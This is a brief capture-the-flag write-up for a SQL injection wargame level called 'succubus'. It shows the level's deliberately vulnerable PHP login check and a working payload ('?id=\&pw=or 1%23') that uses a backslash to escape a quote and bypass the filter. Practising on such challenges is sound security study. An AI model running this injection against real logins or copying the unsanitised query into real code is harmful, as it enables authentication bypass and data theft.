```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

QUERY: select id from prob_succubus where id='' and pw='';
       Giving a \ will numb the character behind it and consider it as a string
       select id from prob_succubus where id='\' and pw='';
       Makes the ' behind slash a part of string; "'\' and pw='"
       
PAYLOAD: ?id=\&pw=or 1%23
OUTPUT: select id from prob_succubus where id='\' and pw='or 1#'

Succubus clear
